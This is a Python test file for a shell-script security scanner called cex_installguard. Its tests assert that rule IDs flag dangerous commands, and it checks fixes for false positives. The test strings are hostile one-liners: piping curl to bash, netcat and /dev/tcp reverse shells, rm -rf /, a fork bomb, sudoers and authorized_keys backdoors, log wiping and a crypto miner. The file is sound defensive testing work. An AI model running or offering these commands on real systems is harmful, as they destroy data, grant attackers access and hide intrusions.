"""Tests for the AST-based analyzer: detections + false-positive fixes."""
from cex_installguard.scanner import scan_text


def ids(text):
    return {f.rule_id for f in scan_text(text)}


# --------------------------------------------------------------------------- #
# Remote execution & supply chain                                              #
# --------------------------------------------------------------------------- #

def test_remote_pipe_to_shell():
    assert 'IG001' in ids('curl https://x.invalid/a | bash')

def test_remote_pipe_to_interpreter():
    assert 'IG034' in ids('curl https://x.invalid/a | python3 -')

def test_wget_pipe_variant():
    assert 'IG001' in ids('wget -qO- https://x.invalid/a | sh')

def test_remote_command_substitution():
    assert 'IG011' in ids('echo "$(curl -s https://x.invalid/a)"')

def test_download_execute_in_same_statement():
    assert 'IG031' in ids('curl http://x.invalid/a -o f && chmod +x f')

def test_staged_artifact_made_executable_after_distance():
    # v13: making a downloaded artifact executable is IG049 (preparation),
    # NOT IG048 (execution) — the two are no longer conflated.
    text = ('curl -sSL https://x.invalid/app -o /tmp/app\n'
            '# several unrelated lines\n'
            '# keep them apart so window correlation cannot fire\n'
            'chmod +x /tmp/app\n')
    got = ids(text)
    assert 'IG049' in got
    assert 'IG048' not in got

def test_url_variable_flows_to_execution():
    text = ('DATA=$(curl -s https://x.invalid/payload)\n'
            '# filler\n# more filler\n'
            'eval "$DATA"\n')
    assert 'IG047' in ids(text)


def test_url_literal_variable_download_then_interpret():
    # passing the artifact to an interpreter is IG050 (interpreted)
    text = ('URL="https://x.invalid/tool"\n'
            'curl "$URL" -o tool.sh\n'
            'bash tool.sh\n')
    assert 'IG050' in ids(text)

def test_decode_piped_to_shell():
    assert 'IG032' in ids('echo payload | base64 -d | bash')

def test_decode_alone_flagged():
    assert 'IG016' in ids('base64 -d payload.b64')

def test_nested_cmdsub_analyzed():
    # $( ) containing its own pipeline is still detected
    assert 'IG001' in ids('eval "$(curl -s http://x.invalid/a | sh)"')


# --------------------------------------------------------------------------- #
# Network hygiene                                                              #
# --------------------------------------------------------------------------- #

def test_insecure_tls_bypass():
    assert 'IG035' in ids('curl -k https://self-signed.invalid/x')

def test_plain_http_retrieval():
    assert 'IG036' in ids('curl http://mirror.invalid/x.tar.gz')

def test_raw_ip_download():
    assert 'IG037' in ids('wget http://203.0.113.7/payload')

def test_download_to_tmp():
    assert 'IG023' in ids('curl https://x.invalid/a -o /tmp/a')

def test_network_retrieval_generic():
    assert 'IG014' in ids('curl https://x.invalid/a')


# --------------------------------------------------------------------------- #
# Destructive operations                                                       #
# --------------------------------------------------------------------------- #

def test_recursive_root_deletion():
    assert 'IG002' in ids('rm -rf /')

def test_wildcard_root_deletion():
    assert 'IG019' in ids('rm -rf /tmp/*')

def test_star_deletion():
    assert 'IG019' in ids('rm -rf *')

def test_var_glob_deletion():
    assert 'IG002' in ids('rm -rf "$TARGET"/*'.replace('"', ''))

def test_block_device_write():
    assert 'IG003' in ids('dd if=img.iso of=/dev/sda')

def test_mkfs():
    assert 'IG004' in ids('mkfs.ext4 /dev/sdb1')

def test_fork_bomb():
    assert 'IG005' in ids(':(){ :|:& };:')


# --------------------------------------------------------------------------- #
# Privilege, permissions, persistence                                          #
# --------------------------------------------------------------------------- #

def test_sudo_flagged():
    assert 'IG006' in ids('sudo true')

def test_world_writable():
    assert 'IG007' in ids('chmod 777 /tmp/x')

def test_recursive_chown():
    assert 'IG008' in ids('chown -R user:user /opt')

def test_setuid_creation():
    assert 'IG046' in ids('chmod u+s /usr/bin/tool')
    assert 'IG046' in ids('chmod 4755 /usr/bin/tool')

def test_sudoers_write():
    assert 'IG040' in ids('echo "x ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers')

def test_authorized_keys_write():
    assert 'IG038' in ids(
        'echo ssh-rsa AAAA >> ~/.ssh/authorized_keys')

def test_elevated_system_modification():
    assert 'IG033' in ids('sudo chmod 777 /etc/demo')

def test_persistence_crontab():
    assert 'IG013' in ids('crontab -l | { cat; echo "@reboot x"; } | crontab -')

def test_systemctl_enable():
    assert 'IG013' in ids('systemctl enable backdoor.service')

def test_user_creation():
    assert 'IG039' in ids('useradd -m backdoor')

def test_hosts_write():
    assert 'IG045' in ids('echo "1.2.3.4 evil" >> /etc/hosts')

def test_config_write_via_redirect():
    assert 'IG009' in ids('echo "x" > /etc/rc.local')

def test_startup_sourcing():
    assert 'IG021' in ids('source ~/.bashrc')


# --------------------------------------------------------------------------- #
# Evasion & indicators                                                         #
# --------------------------------------------------------------------------- #

def test_history_suppression():
    assert 'IG041' in ids('history -c')
    assert 'IG041' in ids('unset HISTFILE')

def test_selinux_disabled():
    assert 'IG042' in ids('setenforce 0')
    assert 'IG042' in ids('aa-disable /usr/bin/foo')

def test_firewall_flush():
    assert 'IG026' in ids('iptables -F')

def test_log_truncation():
    assert 'IG027' in ids('truncate -s 0 /var/log/auth.log')

def test_self_deletion():
    assert 'IG017' in ids('rm -f "$0"')

def test_cryptomining():
    assert 'IG043' in ids('xmrig --donate-level 1 -o stratum+tcp://pool.x:3333')

def test_reverse_shell():
    assert 'IG022' in ids('nc -e /bin/sh 10.0.0.1 4444')
    assert 'IG022' in ids('exec 3<>/dev/tcp/10.0.0.1/4444')


# --------------------------------------------------------------------------- #
# Dynamic execution & secrets                                                  #
# --------------------------------------------------------------------------- #

def test_dynamic_eval():
    assert 'IG010' in ids('eval "$PAYLOAD"')

def test_interpreter_dash_c():
    assert 'IG015' in ids('python3 -c "import os; os.system(\'id\')"')

def test_bash_dash_c():
    assert 'IG024' in ids('bash -c "$CMD"')

def test_path_injection():
    assert 'IG020' in ids('export LD_PRELOAD=/tmp/evil.so')

def test_credential_assignment():
    assert 'IG018' in ids('api_key="hunter2supersecret"')

def test_secret_print():
    assert 'IG029' in ids('echo "$API_TOKEN"')

def test_package_install():
    assert 'IG012' in ids('apt install -y curl')

def test_process_sweep():
    assert 'IG025' in ids('killall sshd')


# --------------------------------------------------------------------------- #
# FALSE-POSITIVE REGRESSIONS (v12 fixes over v11)                              #
# --------------------------------------------------------------------------- #

def test_fp_quoted_var_in_rm_not_flagged_ig030():
    # v11 flagged any rm with a variable; v12 only flags *unquoted* ones
    assert 'IG030' not in ids('rm -rf "$SAFE_DIR"')

def test_fp_unquoted_var_in_rm_still_flagged():
    assert 'IG030' in ids('rm -rf $TARGET')

def test_fp_path_append_not_flagged():
    # appending to PATH is standard practice, not injection
    assert 'IG020' not in ids('export PATH="$PATH:/opt/tool/bin"')

def test_fp_path_replace_still_flagged():
    assert 'IG020' in ids('export PATH="/tmp/evil:$PATH"'
                          .replace(':$PATH', ''))

def test_fp_static_eval_not_flagged():
    assert 'IG010' not in ids('eval "echo static words"')

def test_fp_secret_literal_not_printed():
    # a literal containing the word PASSWORD is not a secret *exposure*
    assert 'IG029' not in ids('echo "your PASSWORD here"')

def test_fp_safe_scripts_clean():
    # the bundled safe examples must stay clean
    import pathlib
    for name in ('safe.sh', 'installer.sh'):
        p = pathlib.Path(__file__).parent.parent / 'examples' / name
        assert scan_text(p.read_text(), str(p)) == [], name

def test_fp_subshell_detection():
    assert 'IG001' in ids('(curl -s http://10.0.0.1/a | sh)')

def test_fp_grouped_statement():
    assert 'IG001' in ids('{ curl -s http://x | sh; }'.replace('{ ', '(')
                          .replace(' }', ')'))
